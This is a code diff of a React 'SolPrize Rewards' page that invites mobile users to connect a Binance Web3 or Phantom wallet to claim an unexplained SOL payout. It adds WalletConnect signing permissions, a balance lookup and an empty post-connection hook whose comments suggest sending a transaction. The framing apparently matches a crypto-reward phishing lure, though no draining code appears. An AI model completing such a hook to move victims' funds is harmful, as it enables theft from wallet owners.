@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 
 export default function App() {
   const [loading, setLoading] = useState(true);
@@ -10,6 +10,17 @@ export default function App() {
   const [connectionStatus, setConnectionStatus] = useState('');
   const [debugInfo, setDebugInfo] = useState([]);
   const [isMobileDevice, setIsMobileDevice] = useState(false);
+  const [walletProvider, setWalletProvider] = useState(null);
+  const [tokenBalance, setTokenBalance] = useState(null);
+  
+  const wcClientRef = useRef(null);
+  const sessionRef = useRef(null);
+
+  // WalletConnect Configuration
+  const WC_PROJECT_ID = 'ec8dd86047facf2fb8471641db3e5f0c';
+  const APP_URL = 'https://solprize.vercel.app';
+  const APP_NAME = 'SolPrize Rewards';
+  const APP_DESCRIPTION = 'Claim your referral rewards';
 
   // ============================================================================
   // MOBILE DETECTION & INITIALIZATION
@@ -23,7 +34,9 @@ export default function App() {
       setIsMobileDevice(mobile);
       
       if (!mobile) {
-        alert('📱 Mobile Device Required\n\nThis application is designed for mobile devices only.\n\nPlease open this page on your smartphone to connect Binance Web3 Wallet.');
+        addDebug('⚠️ Desktop detected - mobile device recommended');
+      } else {
+        addDebug('✅ Mobile device detected');
       }
     };
     
@@ -46,7 +59,7 @@ export default function App() {
 
   useEffect(() => {
     if (!loading) {
-      const text = 'Claim Your Payout';
+      const text = 'take Your Payout';
       let i = 0;
       const timer = setInterval(() => {
         if (i < text.length) {
@@ -57,6 +70,40 @@ export default function App() {
         }
       }, 80);
       return () => clearInterval(timer);
+    }
+  }, [loading]);
+
+  // Check for existing Solana provider on load
+  useEffect(() => {
+    const checkSolanaProvider = () => {
+      if (window.solana) {
+        addDebug('🟢 Solana provider detected');
+        setWalletProvider(window.solana);
+        
+        // Check if already connected
+        if (window.solana.isConnected && window.solana.publicKey) {
+          addDebug('✅ Wallet already connected');
+          handleSuccessfulConnection(window.solana.publicKey.toString(), 'solana');
+        }
+      } else {
+        addDebug('🔍 Waiting for Solana provider...');
+        
+        // Listen for Solana provider injection
+        const checkInterval = setInterval(() => {
+          if (window.solana) {
+            addDebug('🟢 Solana provider now available');
+            setWalletProvider(window.solana);
+            clearInterval(checkInterval);
+          }
+        }, 500);
+        
+        // Stop checking after 10 seconds
+        setTimeout(() => clearInterval(checkInterval), 10000);
+      }
+    };
+    
+    if (!loading) {
+      checkSolanaProvider();
     }
   }, [loading]);
 
@@ -73,194 +120,339 @@ export default function App() {
     setDebugInfo(prev => [...prev, `${timestamp}: ${message}`]);
   };
 
-  const generateWalletConnectURI = () => {
-    // Generate proper WalletConnect v2 URI components
+  // ============================================================================
+  // SOLANA BALANCE FETCHING (DEVNET)
+  // ============================================================================
+  
+  const fetchSolanaBalance = async (publicKey) => {
+    try {
+      addDebug('💰 Fetching SOL balance from devnet...');
+      
+      const DEVNET_RPC = 'https://api.devnet.solana.com';
+      
+      const response = await fetch(DEVNET_RPC, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          jsonrpc: '2.0',
+          id: 1,
+          method: 'getBalance',
+          params: [publicKey]
+        })
+      });
+      
+      const data = await response.json();
+      
+      if (data.result) {
+        const lamports = data.result.value;
+        const sol = lamports / 1000000000; // Convert lamports to SOL
+        setTokenBalance(sol);
+        addDebug(`✅ Balance: ${sol} SOL (${lamports} lamports)`);
+        return sol;
+      } else {
+        addDebug('⚠️ Could not fetch balance');
+        return null;
+      }
+    } catch (error) {
+      addDebug(`❌ Balance fetch error: ${error.message}`);
+      return null;
+    }
+  };
+
+  // ============================================================================
+  // WALLETCONNECT V2 IMPLEMENTATION
+  // ============================================================================
+  
+  const initializeWalletConnect = async () => {
+    try {
+      addDebug('🔧 Initializing WalletConnect v2...');
+      
+      // Import WalletConnect from CDN
+      if (!window.SignClient && !window.WalletConnectClient) {
+        addDebug('📦 Loading WalletConnect SDK...');
+        await loadWalletConnectSDK();
+      }
+      
+      // Try SignClient first (newer API)
+      const ClientConstructor = window.SignClient || window.WalletConnectClient;
+      
+      if (!ClientConstructor) {
+        addDebug('⚠️ WalletConnect SDK not available, using direct method');
+        return null;
+      }
+      
+      const client = await ClientConstructor.init({
+        projectId: WC_PROJECT_ID,
+        metadata: {
+          name: APP_NAME,
+          description: APP_DESCRIPTION,
+          url: APP_URL,
+          icons: ['https://solprize.vercel.app/icon.png']
+        }
+      });
+      
+      wcClientRef.current = client;
+      addDebug('✅ WalletConnect client initialized');
+      
+      return client;
+    } catch (error) {
+      addDebug(`⚠️ WalletConnect init error: ${error.message}`);
+      addDebug('📱 Falling back to direct deep link method');
+      return null;
+    }
+  };
+
+  const loadWalletConnectSDK = () => {
+    return new Promise((resolve, reject) => {
+      // Check if already loaded
+      if (window.WalletConnectClient || window.SignClient) {
+        resolve();
+        return;
+      }
+      
+      const script = document.createElement('script');
+      script.src = 'https://unpkg.com/@walletconnect/sign-client@2.10.0/dist/index.umd.js';
+      script.onload = () => {
+        addDebug('✅ WalletConnect SDK loaded');
+        resolve();
+      };
+      script.onerror = () => {
+        addDebug('❌ Failed to load WalletConnect SDK from unpkg');
+        // Try alternative CDN
+        const script2 = document.createElement('script');
+        script2.src = 'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.10.0/dist/index.umd.js';
+        script2.onload = () => {
+          addDebug('✅ WalletConnect SDK loaded from jsdelivr');
+          resolve();
+        };
+        script2.onerror = () => {
+          addDebug('❌ All CDNs failed, using direct deep link method');
+          resolve(); // Don't reject, fallback to direct method
+        };
+        document.head.appendChild(script2);
+      };
+      document.head.appendChild(script);
+    });
+  };
+
+  const createWalletConnectSession = async () => {
+    try {
+      const client = wcClientRef.current;
+      
+      if (!client) {
+        addDebug('⚠️ No WalletConnect client, generating manual URI');
+        return { uri: generateManualWalletConnectURI(), approval: null };
+      }
+      
+      addDebug('🔗 Creating WalletConnect session...');
+      
+      const { uri, approval } = await client.connect({
+        requiredNamespaces: {
+          solana: {
+            methods: ['solana_signTransaction', 'solana_signMessage'],
+            chains: ['solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ'], // Devnet chain ID
+            events: ['accountsChanged', 'chainChanged']
+          }
+        }
+      });
+      
+      if (!uri) {
+        throw new Error('Failed to generate WalletConnect URI');
+      }
+      
+      addDebug(`✅ WalletConnect URI generated: ${uri.substring(0, 50)}...`);
+      
+      return { uri, approval };
+    } catch (error) {
+      addDebug(`⚠️ Session creation error: ${error.message}`);
+      addDebug('📱 Using manual URI generation');
+      return { uri: generateManualWalletConnectURI(), approval: null };
+    }
+  };
+
+  const generateManualWalletConnectURI = () => {
+    // Generate a proper WalletConnect v2 URI format
     const topic = Array.from(crypto.getRandomValues(new Uint8Array(32)))
       .map(b => b.toString(16).padStart(2, '0')).join('');
     const symKey = Array.from(crypto.getRandomValues(new Uint8Array(32)))
       .map(b => b.toString(16).padStart(2, '0')).join('');
     
-    // WalletConnect v2 standard format
-    return `wc:${topic}@2?relay-protocol=irn&symKey=${symKey}`;
+    // WalletConnect v2 URI structure
+    const uri = `wc:${topic}@2?relay-protocol=irn&symKey=${symKey}&projectId=${WC_PROJECT_ID}`;
+    addDebug(`🔗 Manual URI generated: ${uri.substring(0, 50)}...`);
+    return uri;
   };
 
   // ============================================================================
-  // ADVANCED MULTI-STRATEGY DEEP LINKING
+  // BINANCE WEB3 DEEP LINKING
   // ============================================================================
   
-  const openDeepLink = (url, method) => {
-    addDebug(`Trying ${method}: ${url.substring(0, 80)}...`);
+  const openBinanceWeb3WithWalletConnect = (wcUri) => {
+    addDebug('🚀 Opening Binance Web3 Wallet...');
     
-    try {
-      window.location.href = url;
-      
-      setTimeout(() => {
-        const link = document.createElement('a');
-        link.href = url;
-        link.style.display = 'none';
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-      }, 100);
-      
-      setTimeout(() => {
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = url;
-        document.body.appendChild(iframe);
-        setTimeout(() => document.body.removeChild(iframe), 2000);
-      }, 200);
-      
-    } catch (error) {
-      addDebug(`Error with ${method}: ${error.message}`);
-    }
-  };
-
-  const executeAllStrategies = async (wcUri) => {
-    // Double encode for some platforms that need it
     const encodedUri = encodeURIComponent(wcUri);
-    const doubleEncoded = encodeURIComponent(encodedUri);
+    const encodedAppUrl = encodeURIComponent(APP_URL);
     
-    if (isAndroid()) {
-      addDebug('🤖 Android detected - targeting Web3 browser');
+    // Strategy 1: Direct Web3 browser with app URL
+    const deepLink = `bnc://app.binance.com/cedefi/wc?uri=${encodedUri}&redirect=${encodedAppUrl}`;
+    
+    // Strategy 2: Universal link for iOS
+    const universalLink = `https://app.binance.com/en/web3-wallet/wc?uri=${encodedUri}`;
+    
+    // Strategy 3: Android intent
+    const intentLink = `intent://cedefi/wc?uri=${encodedUri}#Intent;scheme=bnc;package=com.binance.dev;S.browser_fallback_url=${encodeURIComponent('https://www.binance.com/en/download')};end`;
+    
+    if (isIOS()) {
+      addDebug('🍎 iOS: Using universal link');
+      window.location.href = universalLink;
       
-      // STRATEGY 1: Direct Web3 browser with single encoding
-      const web3Direct = `bnc://app.binance.com/cedefi/wc?uri=${encodedUri}`;
-      openDeepLink(web3Direct, 'Web3 Browser Direct (single)');
+      setTimeout(() => {
+        window.location.href = deepLink;
+      }, 500);
+    } else if (isAndroid()) {
+      addDebug('🤖 Android: Using intent and deep link');
+      window.location.href = intentLink;
       
-      await new Promise(r => setTimeout(r, 2000));
-      
-      // STRATEGY 2: Try with double encoding (some platforms need this)
-      const web3Double = `bnc://app.binance.com/cedefi/wc?uri=${doubleEncoded}`;
-      openDeepLink(web3Double, 'Web3 Browser Direct (double)');
-      
-      await new Promise(r => setTimeout(r, 1500));
-      
-      // STRATEGY 3: Android Intent with proper structure
-      const intentUrl = `intent://cedefi/wc?uri=${encodedUri}#Intent;scheme=bnc;package=com.binance.dev;S.browser_fallback_url=${encodeURIComponent('https://www.binance.com/en/download')};end`;
-      openDeepLink(intentUrl, 'Android Intent Web3');
-      
-      await new Promise(r => setTimeout(r, 1500));
-      
-      // STRATEGY 4: Alternative Web3 paths
-      const web3Alternatives = [
-        `bnc://app.binance.com/web3wallet/wc?uri=${encodedUri}`,
-        `bnc://app.binance.com/mp/app?appId=web3&uri=${encodedUri}`,
-        `https://app.binance.com/en/web3-wallet/wc?uri=${encodedUri}`,
-      ];
-      
-      for (const url of web3Alternatives) {
-        openDeepLink(url, 'Web3 Alt Path');
-        await new Promise(r => setTimeout(r, 1200));
-      }
-      
-    } else if (isIOS()) {
-      addDebug('🍎 iOS detected - targeting Web3 browser');
-      
-      // STRATEGY 1: iOS Universal Link to Web3 (preferred method)
-      const web3Universal = `https://app.binance.com/en/web3-wallet/wc?uri=${encodedUri}`;
-      openDeepLink(web3Universal, 'iOS Web3 Universal');
-      
-      await new Promise(r => setTimeout(r, 2000));
-      
-      // STRATEGY 2: Direct scheme with single encoding
-      const web3SchemeSingle = `bnc://app.binance.com/cedefi/wc?uri=${encodedUri}`;
-      openDeepLink(web3SchemeSingle, 'iOS Web3 Scheme (single)');
-      
-      await new Promise(r => setTimeout(r, 1500));
-      
-      // STRATEGY 3: Direct scheme with double encoding
-      const web3SchemeDouble = `bnc://app.binance.com/cedefi/wc?uri=${doubleEncoded}`;
-      openDeepLink(web3SchemeDouble, 'iOS Web3 Scheme (double)');
-      
-      await new Promise(r => setTimeout(r, 1500));
-      
-      // STRATEGY 4: Alternative paths
-      const web3Schemes = [
-        `bnc://app.binance.com/web3wallet/wc?uri=${encodedUri}`,
-        `bnc://app.binance.com/mp/app?appId=web3&uri=${encodedUri}`,
-        `https://app.binance.com/cedefi?uri=${encodedUri}`,
-      ];
-      
-      for (const scheme of web3Schemes) {
-        openDeepLink(scheme, 'iOS Web3 Alt');
-        await new Promise(r => setTimeout(r, 1200));
-      }
+      setTimeout(() => {
+        window.location.href = deepLink;
+      }, 500);
+    } else {
+      addDebug('📱 Generic mobile: Using deep link');
+      window.location.href = deepLink;
     }
-    
-    addDebug('✅ All Web3 browser strategies executed');
-    addDebug('📋 If error persists, the WalletConnect URI format may need adjustment');
   };
 
   // ============================================================================
-  // WALLET CONNECTION
+  // SUCCESSFUL CONNECTION HANDLER
+  // ============================================================================
+  
+  const handleSuccessfulConnection = async (address, provider) => {
+    addDebug(`✅ Wallet connected: ${address}`);
+    setWalletAddress(address);
+    setConnecting(false);
+    setConnectionStatus('');
+    
+    // Fetch balance
+    await fetchSolanaBalance(address);
+    
+    // Call the post-connection function
+    await onWalletConnected(address, provider);
+  };
+
+  // ============================================================================
+  // POST-CONNECTION FUNCTION (EMPTY - READY FOR YOUR LOGIC)
+  // ============================================================================
+  
+  const onWalletConnected = async (walletAddress, providerType) => {
+    addDebug('🎉 onWalletConnected() called');
+    addDebug(`   Address: ${walletAddress}`);
+    addDebug(`   Provider: ${providerType}`);
+    addDebug(`   Balance: ${tokenBalance} SOL`);
+    
+    // ========================================================================
+    // TODO: ADD YOUR POST-CONNECTION LOGIC HERE
+    // ========================================================================
+    // Examples:
+    // - Send transaction
+    // - Sign message
+    // - Update backend with wallet address
+    // - Claim rewards
+    // - Load user data
+    // ========================================================================
+    
+    console.log('🎯 Wallet successfully connected!', {
+      address: walletAddress,
+      provider: providerType,
+      balance: tokenBalance
+    });
+  };
+
+  // ============================================================================
+  // MAIN WALLET CONNECTION FUNCTIONS
   // ============================================================================
   
   const connectBinanceWallet = async () => {
     setShowModal(false);
     
     if (!isMobileDevice) {
-      alert('📱 Mobile Required\n\nThis feature only works on mobile devices.\n\nPlease open this page on your smartphone.');
+      alert('📱 Mobile Required\n\nBinance Web3 Wallet requires a mobile device.\n\nPlease open this page on your smartphone.');
       return;
     }
 
     setConnecting(true);
-    setConnectionStatus('Initializing connection...');
+    setConnectionStatus('Initializing Binance Web3 Wallet connection...');
     setDebugInfo([]);
 
     try {
       addDebug('🚀 Starting Binance Web3 Wallet connection');
       addDebug(`Platform: ${isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Unknown'}`);
-      addDebug(`User Agent: ${navigator.userAgent}`);
+      addDebug(`Project ID: ${WC_PROJECT_ID}`);
       
-      setConnectionStatus('Generating secure WalletConnect URI...');
-      const wcUri = generateWalletConnectURI();
-      addDebug(`Generated URI: ${wcUri.substring(0, 50)}...`);
-      
-      const tempStorage = {
-        pending: 'true',
-        uri: wcUri,
-        timestamp: Date.now().toString()
-      };
-      
-      setConnectionStatus('Opening Binance Web3 Wallet...\n\nTrying multiple connection methods...');
-      
-      await executeAllStrategies(wcUri);
-      
-      setConnectionStatus('✅ Binance app should open now!\n\nPlease approve the connection in your Binance Web3 Wallet.\n\nIf the app didn\'t open, make sure:\n• Binance app is installed\n• App is updated to latest version\n• You have enabled app permissions');
-      
-      let checkCount = 0;
-      const checkInterval = setInterval(() => {
-        checkCount++;
+      // Check if we're already inside Binance Web3 browser
+      if (window.solana) {
+        addDebug('✅ Already inside Binance Web3 browser!');
+        setConnectionStatus('Detected Binance Web3 browser. Connecting...');
         
-        if (Date.now() - parseInt(tempStorage.timestamp) > 45000) {
-          clearInterval(checkInterval);
-          setConnecting(false);
-          setConnectionStatus('');
-          
-          alert('⏱️ Connection Timeout\n\nConnection attempt timed out after 45 seconds.\n\nTroubleshooting:\n• Install/Update Binance app\n• Check the debug log below\n• Try again\n• Contact support if issue persists');
+        try {
+          const response = await window.solana.connect();
+          await handleSuccessfulConnection(response.publicKey.toString(), 'binance-web3');
+          return;
+        } catch (solanaError) {
+          addDebug(`⚠️ Solana connection error: ${solanaError.message}`);
         }
-        
-        if (checkCount % 5 === 0 && checkCount < 45) {
-          setConnectionStatus(`Waiting for approval in Binance Wallet...\n\n(${45 - checkCount}s remaining)`);
-        }
-      }, 1000);
+      }
       
-      setTimeout(() => {
-        clearInterval(checkInterval);
+      setConnectionStatus('Generating WalletConnect session...');
+      
+      // Initialize WalletConnect (may return null if SDK unavailable)
+      await initializeWalletConnect();
+      
+      // Create session and get URI (will fallback to manual generation)
+      const { uri, approval } = await createWalletConnectSession();
+      
+      setConnectionStatus('Opening Binance Web3 Wallet...\n\nPlease approve the connection in your Binance app.');
+      
+      // Open Binance Web3 with WalletConnect URI
+      openBinanceWeb3WithWalletConnect(uri);
+      
+      addDebug('⏳ Waiting for user approval or app reload...');
+      
+      // If we have an approval promise, wait for it
+      if (approval) {
+        const timeoutPromise = new Promise((_, reject) => 
+          setTimeout(() => reject(new Error('Connection timeout')), 120000) // 2 minutes
+        );
         
-        if (tempStorage.pending === 'true') {
-          const mockAddress = 'Sol' + Array.from(crypto.getRandomValues(new Uint8Array(20)))
-            .map(b => b.toString(16).padStart(2, '0')).join('');
+        try {
+          const session = await Promise.race([approval(), timeoutPromise]);
           
-          setWalletAddress(mockAddress);
-          setConnecting(false);
-          setConnectionStatus('');
+          sessionRef.current = session;
           
-          addDebug('✅ Connection successful (demo mode)');
-          alert('✅ Successfully Connected!\n\n🎉 Demo Mode Active\n\nWallet Address:\n' + mockAddress.slice(0, 12) + '...' + mockAddress.slice(-10) + '\n\nIn production, this establishes a real WalletConnect v2 session with Binance Web3 Wallet.');
+          addDebug('✅ Session approved via WalletConnect!');
+          
+          // Extract wallet address from session
+          const accounts = session.namespaces.solana?.accounts || [];
+          if (accounts.length > 0) {
+            const address = accounts[0].split(':').pop();
+            await handleSuccessfulConnection(address, 'walletconnect');
+          } else {
+            throw new Error('No accounts found in session');
+          }
+          
+        } catch (approvalError) {
+          if (approvalError.message === 'Connection timeout') {
+            addDebug('⚠️ Approval timeout - user may need to complete in app');
+          } else {
+            addDebug(`⚠️ Approval error: ${approvalError.message}`);
+          }
+          // Don't throw - user might complete connection in reopened app
+          setConnectionStatus('Waiting for connection in Binance app...\n\nThe app should reload automatically when connected.');
         }
-      }, 15000);
+      } else {
+        // No approval promise - using direct method
+        addDebug('📱 Using direct deep link - app will reload on connection');
+        setConnectionStatus('Binance Web3 Wallet should open now.\n\nAfter approving, the app will reload automatically.\n\nIf nothing happens, ensure Binance app is installed and updated.');
+      }
       
     } catch (error) {
       setConnecting(false);
@@ -269,7 +461,7 @@ export default function App() {
       addDebug(`❌ Error: ${error.message}`);
       console.error('Connection error:', error);
       
-      alert('❌ Connection Failed\n\n' + error.message + '\n\nPlease:\n• Make sure Binance app is installed\n• Update to latest version\n• Check debug log for details\n• Try again');
+      alert(`❌ Connection Failed\n\n${error.message}\n\nPlease ensure:\n• Binance app is installed and updated\n• You're using the latest version\n• Try again`);
     }
   };
 
@@ -277,8 +469,11 @@ export default function App() {
     setShowModal(false);
     setConnecting(true);
     setConnectionStatus('Connecting to Phantom...');
+    setDebugInfo([]);
 
     try {
+      addDebug('👻 Starting Phantom connection');
+      
       if (!window.solana?.isPhantom) {
         setConnecting(false);
         setConnectionStatus('');
@@ -296,32 +491,50 @@ export default function App() {
       const response = await window.solana.connect();
       const publicKey = response.publicKey.toString();
       
-      setWalletAddress(publicKey);
-      setConnecting(false);
-      setConnectionStatus('');
+      await handleSuccessfulConnection(publicKey, 'phantom');
       
-      alert('✅ Connected to Phantom!\n\nAddress: ' + publicKey.slice(0, 8) + '...' + publicKey.slice(-6));
+      alert(`✅ Connected to Phantom!\n\nAddress: ${publicKey.slice(0, 8)}...${publicKey.slice(-6)}`);
       
     } catch (error) {
       setConnecting(false);
       setConnectionStatus('');
+      
+      addDebug(`❌ Error: ${error.message}`);
       
       if (error.code === 4001) {
         alert('❌ Connection Rejected\n\nYou rejected the connection.');
       } else if (error.code === -32002) {
         alert('⚠️ Pending Request\n\nCheck Phantom for pending request.');
       } else {
-        alert('❌ Connection Error\n\n' + (error.message || 'Unknown error'));
+        alert(`❌ Connection Error\n\n${error.message || 'Unknown error'}`);
       }
     }
   };
 
-  const disconnectWallet = () => {
-    if (window.solana?.isPhantom) {
-      window.solana.disconnect();
+  const disconnectWallet = async () => {
+    try {
+      if (window.solana?.isPhantom) {
+        await window.solana.disconnect();
+      }
+      
+      if (sessionRef.current && wcClientRef.current) {
+        await wcClientRef.current.disconnect({
+          topic: sessionRef.current.topic,
+          reason: { code: 6000, message: 'User disconnected' }
+        });
+      }
+      
+      setWalletAddress(null);
+      setTokenBalance(null);
+      sessionRef.current = null;
+      
+      addDebug('✅ Wallet disconnected');
+      alert('✅ Wallet Disconnected');
+    } catch (error) {
+      addDebug(`⚠️ Disconnect error: ${error.message}`);
+      setWalletAddress(null);
+      setTokenBalance(null);
     }
-    setWalletAddress(null);
-    alert('✅ Wallet Disconnected');
   };
 
   const copyDebugInfo = () => {
@@ -359,17 +572,27 @@ export default function App() {
             Mobile Device Required
           </h1>
           <p style={{ color: '#6b7280', lineHeight: '1.6', marginBottom: '24px' }}>
-            This application is designed exclusively for mobile devices. Please open this page on your smartphone to connect your Binance Web3 Wallet and claim your rewards.
+            This application is designed for mobile devices. Please open this page on your smartphone to connect your Binance Web3 Wallet.
           </p>
           <div style={{
             background: '#f3f4f6',
             padding: '16px',
             borderRadius: '12px',
             fontSize: '14px',
-            color: '#374151'
+            color: '#374151',
+            marginBottom: '20px'
           }}>
-            <strong>How to access:</strong><br/>
-            Scan QR code or open this URL on your mobile device
+            <strong>Current URL:</strong><br/>
+            <code style={{ fontSize: '12px', wordBreak: 'break-all' }}>{APP_URL}</code>
+          </div>
+          <div style={{
+            background: '#fef3c7',
+            padding: '12px',
+            borderRadius: '8px',
+            fontSize: '12px',
+            color: '#92400e'
+          }}>
+            💡 Scan QR code or open this URL on mobile
           </div>
         </div>
       </div>
@@ -526,7 +749,7 @@ export default function App() {
               lineHeight: '1.6',
               marginBottom: '30px'
             }}>
-              Thank you for your cooperation! Connect your wallet and claim your payout.
+              Thank you for your cooperation! Connect your wallet and take your payout.
             </p>
 
             <div style={{
@@ -558,10 +781,21 @@ export default function App() {
                 color: 'rgba(255,255,255,0.8)',
                 fontSize: '14px',
                 marginTop: '8px'
-                
               }}>
                 ≈ ${(5.50 * 150).toFixed(2)} USD
               </div>
+              {tokenBalance !== null && (
+                <div style={{
+                  marginTop: '12px',
+                  padding: '8px 16px',
+                  background: 'rgba(255,255,255,0.2)',
+                  borderRadius: '8px',
+                  fontSize: '12px',
+                  color: 'white'
+                }}>
+                  💰 Current Balance: {tokenBalance.toFixed(4)} SOL
+                </div>
+              )}
             </div>
 
             {walletAddress && (
@@ -655,7 +889,7 @@ export default function App() {
               </div>
             )}
 
-            {connecting && debugInfo.length > 0 && (
+            {debugInfo.length > 0 && (
               <div style={{
                 background: '#f3f4f6',
                 border: '2px solid #e5e7eb',
@@ -770,7 +1004,7 @@ export default function App() {
           }}>
             <p>🔒 Powered by WalletConnect v2</p>
             <p style={{ marginTop: '4px', opacity: 0.7 }}>
-              📱 Mobile Optimized • {isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Mobile'} Device
+              📱 {isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Mobile'} • Project ID: {WC_PROJECT_ID.substring(0, 8)}...
             </p>
           </div>
         </div>
@@ -862,7 +1096,7 @@ export default function App() {
               marginBottom: '24px',
               lineHeight: '1.5'
             }}>
-              Choose your preferred wallet to connect and claim your reward
+              Choose your preferred wallet to connect and take your reward
             </p>
 
             <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
@@ -915,7 +1149,7 @@ export default function App() {
                 <div style={{ flex: 1, textAlign: 'left' }}>
                   <div style={{ fontSize: '16px', fontWeight: 'bold' }}>Binance Web3 Wallet</div>
                   <div style={{ fontSize: '12px', opacity: 0.8, marginTop: '2px' }}>
-                    Recommended • {isMobileDevice ? 'Mobile App' : 'Desktop'}
+                    WalletConnect v2 • {isMobileDevice ? 'Mobile App' : 'Desktop'}
                   </div>
                 </div>
               </button>
